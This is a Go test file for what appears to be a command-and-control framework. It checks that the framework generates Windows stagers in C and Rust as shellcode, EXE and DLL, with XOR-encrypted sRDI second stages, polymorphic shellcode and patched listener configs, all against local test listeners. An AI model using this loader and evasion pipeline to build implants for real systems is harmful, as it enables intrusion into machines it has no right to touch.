package services

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"net"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/user/wisp/internal/server"
	"github.com/user/wisp/internal/srdi"
	"github.com/user/wisp/internal/stager"
	"github.com/user/wisp/shared/protocol"
)

// seedTemplates copies the prebuilt agent DLL template into the test binary's
// exeDir()/templates so dllTemplateFor() finds it.
func seedTemplates(t *testing.T) error {
	t.Helper()
	src := filepath.Join("bin", "templates", "agent_windows_amd64.dll")
	data, err := os.ReadFile(src)
	if err != nil {
		// try repo layout src/bin/templates
		src = filepath.Join("..", "bin", "templates", "agent_windows_amd64.dll")
		data, err = os.ReadFile(src)
		if err != nil {
			return err
		}
	}
	dstDir := filepath.Join(exeDir(), "templates")
	if err := os.MkdirAll(dstDir, 0755); err != nil {
		return err
	}
	return os.WriteFile(filepath.Join(dstDir, "agent_windows_amd64.dll"), data, 0644)
}

// TestGenerateCStager verifies the full tiny-C-stager flow: issue a XOR stage,
// build the ~2.3 KB blob, and check the stage store returns XOR-encrypted data
// that round-trips with the embedded key.
func TestGenerateCStager(t *testing.T) {
	// The C stager needs the prebuilt agent DLL template. Copy it from the
	// repo's bin/templates into the test binary's directory.
	if err := seedTemplates(t); err != nil {
		t.Fatalf("seed templates: %v", err)
	}

	database, err := openTestDB(t)
	if err != nil {
		t.Fatal(err)
	}
	svc := &ServerService{db: database}
	srv, err := server.New(database, nil)
	if err != nil {
		t.Fatalf("new server: %v", err)
	}
	svc.server = srv

	ln, err := database.CreateListener("stager-http", "http", "127.0.0.1", 8801, false, "", "127.0.0.1")
	if err != nil {
		t.Fatalf("create listener: %v", err)
	}

	ss := &ShellcodeService{serverSvc: svc}
	dir, err := os.MkdirTemp("", "cstager-out-*")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(dir)

	res, err := ss.GenerateStager(ShellcodeConfig{
		ListenerID: ln.ID,
		TargetOS:   "windows",
		TargetArch: "amd64",
		Mode:       "staged",
		StagerLang: "c",
		Format:     "raw",
		OutputPath: filepath.Join(dir, "stager.bin"),
	})
	if err != nil {
		t.Fatalf("GenerateStager(c): %v", err)
	}
	if res == nil {
		t.Fatal("nil result")
	}
	if res.Size == 0 || res.Size > 6000 {
		t.Fatalf("C stager size = %d, want ~2.3 KB (<=6000)", res.Size)
	}
	blob, err := os.ReadFile(res.StagerPath)
	if err != nil {
		t.Fatalf("read stager: %v", err)
	}
	t.Logf("C stager: %d bytes (stage url %s)", res.Size, res.StageURL)

	// Verify the blob decodes: prologue + config geometry
	configOff, size := stager.Describe(blob)
	if size != len(blob) || configOff >= len(blob) {
		t.Fatalf("bad geometry: configOff=%d size=%d blob=%d", configOff, size, len(blob))
	}

	// Verify the XOR stage round-trips with the embedded key.
	keyB64, encB64, ok := srv.ConsumeStage(res.Token)
	if !ok {
		t.Fatalf("consume stage %s failed", res.Token)
	}
	key, err := base64.StdEncoding.DecodeString(keyB64)
	if err != nil {
		t.Fatal(err)
	}
	enc, err := base64.StdEncoding.DecodeString(encB64)
	if err != nil {
		t.Fatal(err)
	}
	if len(key) != 32 {
		t.Fatalf("key len = %d", len(key))
	}
	// XOR-decrypt with the key and confirm it's the sRDI-packed stage2.
	plain := make([]byte, len(enc))
	for i, b := range enc {
		plain[i] = b ^ key[i%len(key)]
	}
	if len(plain) < 28+1173 {
		t.Fatalf("decrypted stage too small: %d", len(plain))
	}
	// sRDI blob begins with the prologue call $+5 (e8) then pop rax (58)
	if plain[0] != 0xE8 || plain[5] != 0x58 {
		t.Fatalf("decrypted stage does not start with sRDI prologue: % x", plain[:8])
	}
	// The embedded DLL (inside the sRDI blob) must carry the config overlay so
	// the loaded agent knows the server address. Unpack the DLL and look for
	// the OverlayMarker followed by base64 JSON containing the listener host.
	dll, err := srdi.Unpack(plain)
	if err != nil {
		t.Fatalf("unpack stage2 dll: %v", err)
	}
	idx := bytes.LastIndex(dll, protocol.OverlayMarker)
	if idx < 0 {
		t.Fatalf("stage2 DLL has no config overlay (agent would have no server address)")
	}
	cfgB64 := strings.TrimSpace(string(dll[idx+len(protocol.OverlayMarker):]))
	cfgJSON, err := base64.StdEncoding.DecodeString(cfgB64)
	if err != nil {
		t.Fatalf("overlay base64 decode: %v", err)
	}
	var cfg struct {
		ServerHost string `json:"server_host"`
		ServerPort int    `json:"server_port"`
		Transport  string `json:"transport"`
	}
	if err := json.Unmarshal(cfgJSON, &cfg); err != nil {
		t.Fatalf("overlay json: %v", err)
	}
	if cfg.ServerHost != "127.0.0.1" || cfg.ServerPort != 8801 {
		t.Fatalf("stage2 overlay server = %s:%d, want 127.0.0.1:8801", cfg.ServerHost, cfg.ServerPort)
	}
	if cfg.Transport != "http" {
		t.Fatalf("stage2 transport = %q, want http", cfg.Transport)
	}
	t.Logf("stage2 overlay carries server=%s:%d transport=%s", cfg.ServerHost, cfg.ServerPort, cfg.Transport)

	// The token was consumed; a second fetch must fail (one-time).
	if _, _, ok2 := srv.ConsumeStage(res.Token); ok2 {
		t.Fatal("stage token reused")
	}
}

// TestCStagerRejectsTLS verifies the tiny C stager refuses HTTPS listeners.
func TestCStagerRejectsTLS(t *testing.T) {
	database, err := openTestDB(t)
	if err != nil {
		t.Fatal(err)
	}
	svc := &ServerService{db: database}
	srv, err := server.New(database, nil)
	if err != nil {
		t.Fatal(err)
	}
	svc.server = srv
	ln, err := database.CreateListener("stager-https", "https", "127.0.0.1", 8443, true, "", "127.0.0.1")
	if err != nil {
		t.Fatalf("create listener: %v", err)
	}

	ss := &ShellcodeService{serverSvc: svc}
	_, err = ss.GenerateStager(ShellcodeConfig{
		ListenerID: ln.ID,
		TargetOS:   "windows",
		TargetArch: "amd64",
		Mode:       "staged",
		StagerLang: "c",
		Format:     "raw",
	})
	if err == nil {
		t.Fatal("expected error for HTTPS + C stager")
	}
}

// TestGenerateShellcodePoly verifies the polymorphic option is applied: the
// output differs from the plain (non-poly) shellcode and is larger.
func TestGenerateShellcodePoly(t *testing.T) {
	if err := seedTemplates(t); err != nil {
		t.Fatalf("seed templates: %v", err)
	}
	database, err := openTestDB(t)
	if err != nil {
		t.Fatal(err)
	}
	svc := &ServerService{db: database}
	srv, err := server.New(database, nil)
	if err != nil {
		t.Fatalf("new server: %v", err)
	}
	svc.server = srv
	ln, err := database.CreateListener("poly-http", "http", "127.0.0.1", 8803, false, "", "127.0.0.1")
	if err != nil {
		t.Fatalf("create listener: %v", err)
	}

	ss := &ShellcodeService{serverSvc: svc}
	dir, err := os.MkdirTemp("", "poly-*")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(dir)

	plain, err := ss.GenerateShellcode(ShellcodeConfig{
		ListenerID: ln.ID,
		TargetOS:   "windows",
		TargetArch: "amd64",
		Mode:       "shellcode",
		Format:     "raw",
		OutputPath: filepath.Join(dir, "plain.bin"),
	})
	if err != nil {
		t.Fatalf("plain: %v", err)
	}
	enc, err := ss.GenerateShellcode(ShellcodeConfig{
		ListenerID: ln.ID,
		TargetOS:   "windows",
		TargetArch: "amd64",
		Mode:       "shellcode",
		Format:     "raw",
		Poly:       true,
		OutputPath: filepath.Join(dir, "poly.bin"),
	})
	if err != nil {
		t.Fatalf("poly: %v", err)
	}

	plainB, _ := os.ReadFile(plain)
	encB, _ := os.ReadFile(enc)
	if bytes.Equal(plainB, encB) {
		t.Fatal("poly output identical to plain output")
	}
	if len(encB) <= len(plainB) {
		t.Fatalf("poly size %d not larger than plain %d", len(encB), len(plainB))
	}
	t.Logf("plain=%d poly=%d", len(plainB), len(encB))
}

// TestResolveIPCheck sanity-checks the resolver used by the C stager.
func TestResolveIPCheck(t *testing.T) {
	ip, err := stager.ResolveIP("127.0.0.1")
	if err != nil {
		t.Fatal(err)
	}
	if !net.IPv4(127, 0, 0, 1).Equal(ip) {
		t.Fatalf("resolved %v", ip)
	}
}

// TestGenerateCStagerExe verifies the C stager can be wrapped into a small
// standalone EXE with mingw (stage1 runs directly on the target).
func TestGenerateCStagerExe(t *testing.T) {
	if findMingwGCC() == "" {
		t.Skip("x86_64-w64-mingw32-gcc not installed")
	}
	if err := seedTemplates(t); err != nil {
		t.Fatalf("seed templates: %v", err)
	}

	database, err := openTestDB(t)
	if err != nil {
		t.Fatal(err)
	}
	svc := &ServerService{db: database}
	srv, err := server.New(database, nil)
	if err != nil {
		t.Fatalf("new server: %v", err)
	}
	svc.server = srv

	ln, err := database.CreateListener("stager-exe", "http", "127.0.0.1", 8802, false, "", "127.0.0.1")
	if err != nil {
		t.Fatalf("create listener: %v", err)
	}

	ss := &ShellcodeService{serverSvc: svc}
	dir, err := os.MkdirTemp("", "cstager-exe-*")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(dir)

	res, err := ss.GenerateStager(ShellcodeConfig{
		ListenerID:   ln.ID,
		TargetOS:     "windows",
		TargetArch:   "amd64",
		Mode:         "staged",
		StagerLang:   "c",
		Format:       "exe",
		OutputPath:   filepath.Join(dir, "stager.exe"),
		ReuseStage:   true,
		StageTTLMinutes: 0, // forever
	})
	if err != nil {
		t.Fatalf("GenerateStager(c,exe): %v", err)
	}
	if res.Size == 0 || res.Size > 200*1024 {
		t.Fatalf("C stager EXE size = %d, want small (<200KB)", res.Size)
	}
	// PE header present
	head, err := os.ReadFile(res.StagerPath)
	if err != nil {
		t.Fatal(err)
	}
	if len(head) < 2 || head[0] != 'M' || head[1] != 'Z' {
		t.Fatalf("output is not a PE (MZ missing)")
	}
	t.Logf("C stager EXE: %d bytes (reusable token, no expiry)", res.Size)

	// Reusable: fetch twice
	if _, _, ok := srv.ConsumeStageRaw(res.Token); !ok {
		t.Fatal("first raw fetch failed")
	}
	if _, _, ok := srv.ConsumeStageRaw(res.Token); !ok {
		t.Fatal("reusable token consumed on first fetch")
	}
}

// TestGenerateCStagerDllTemplate verifies the DLL stager is built from the
// precompiled template (config patched, no compiler invoked) and that the
// embedded sentinel config is replaced with the real one.
func TestGenerateCStagerDllTemplate(t *testing.T) {
	if err := seedTemplates(t); err != nil {
		t.Fatalf("seed templates: %v", err)
	}
	database, err := openTestDB(t)
	if err != nil {
		t.Fatal(err)
	}
	svc := &ServerService{db: database}
	srv, err := server.New(database, nil)
	if err != nil {
		t.Fatalf("new server: %v", err)
	}
	svc.server = srv

	ln, err := database.CreateListener("stager-http", "http", "127.0.0.1", 8802, false, "", "127.0.0.1")
	if err != nil {
		t.Fatalf("create listener: %v", err)
	}
	ss := &ShellcodeService{serverSvc: svc}
	dir, err := os.MkdirTemp("", "cstager-dll-out-*")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(dir)

	res, err := ss.GenerateStager(ShellcodeConfig{
		ListenerID: ln.ID,
		TargetOS:   "windows",
		TargetArch: "amd64",
		Mode:       "staged",
		StagerLang: "c",
		Format:     "dll",
		OutputPath: filepath.Join(dir, "stager.dll"),
	})
	if err != nil {
		t.Fatalf("GenerateStager(dll): %v", err)
	}
	if res == nil || res.StagerPath == "" {
		t.Fatal("nil result")
	}
	// Template patched: no compiler, so size == template size (14848).
	if !strings.HasSuffix(res.StagerPath, ".dll") {
		t.Fatalf("expected .dll output, got %s", res.StagerPath)
	}
	data, err := os.ReadFile(res.StagerPath)
	if err != nil {
		t.Fatalf("read dll: %v", err)
	}
	if !bytes.Contains(data, []byte("MZ")) {
		t.Fatal("output is not a PE binary")
	}
	if bytes.Contains(data, []byte("/WISP_SENTINEL/")) {
		t.Fatal("sentinel path not patched out")
	}
	// Real stage path from the listener should be present.
	if !bytes.Contains(data, []byte("/stage/")) {
		t.Fatalf("real stage path not embedded")
	}
	t.Logf("DLL stager: %d bytes", len(data))
}

// seedRustStagerTemplate copies the precompiled Rust stager EXE template into
// the test binary's templates dir.
func seedRustStagerTemplate(t *testing.T) error {
	t.Helper()
	src := filepath.Join("bin", "templates", "stager_rust_template.exe")
	data, err := os.ReadFile(src)
	if err != nil {
		src = filepath.Join("..", "bin", "templates", "stager_rust_template.exe")
		data, err = os.ReadFile(src)
		if err != nil {
			return err
		}
	}
	dstDir := filepath.Join(exeDir(), "templates")
	if err := os.MkdirAll(dstDir, 0755); err != nil {
		return err
	}
	return os.WriteFile(filepath.Join(dstDir, "stager_rust_template.exe"), data, 0644)
}

// TestGenerateRustStagerTemplate verifies the Rust stager is built from the
// precompiled template (config patched, no compilation) and produces a PE that
// no longer contains the 0xCC sentinel.
func TestGenerateRustStagerTemplate(t *testing.T) {
	if err := seedTemplates(t); err != nil {
		t.Fatalf("seed agent dll: %v", err)
	}
	if err := seedRustStagerTemplate(t); err != nil {
		t.Fatalf("seed rust stager: %v", err)
	}
	database, err := openTestDB(t)
	if err != nil {
		t.Fatal(err)
	}
	svc := &ServerService{db: database}
	srv, err := server.New(database, nil)
	if err != nil {
		t.Fatalf("new server: %v", err)
	}
	svc.server = srv

	ln, err := database.CreateListener("stager-http", "http", "127.0.0.1", 8810, false, "", "127.0.0.1")
	if err != nil {
		t.Fatalf("create listener: %v", err)
	}
	ss := &ShellcodeService{serverSvc: svc}
	dir, err := os.MkdirTemp("", "rust-stager-out-*")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(dir)

	res, err := ss.GenerateStager(ShellcodeConfig{
		ListenerID: ln.ID,
		TargetOS:   "windows",
		TargetArch: "amd64",
		Mode:       "staged",
		StagerLang: "rust",
		Format:     "exe",
		OutputPath: filepath.Join(dir, "stager.exe"),
	})
	if err != nil {
		t.Fatalf("GenerateStager(rust): %v", err)
	}
	if res == nil || res.StagerPath == "" {
		t.Fatal("nil result")
	}
	data, err := os.ReadFile(res.StagerPath)
	if err != nil {
		t.Fatalf("read rust stager: %v", err)
	}
	if !bytes.HasPrefix(data, []byte("MZ")) {
		t.Fatal("output is not a PE binary")
	}
	// Sentinel must be gone (config patched) and the real stage URL present.
	if bytes.Contains(data, bytes.Repeat([]byte{0xCC}, 320)) {
		t.Fatal("config sentinel not patched")
	}
	if !bytes.Contains(data, []byte("/stage/")) {
		t.Fatalf("real stage URL not embedded")
	}
	t.Logf("Rust stager: %d bytes (url %s)", len(data), res.StageURL)
}
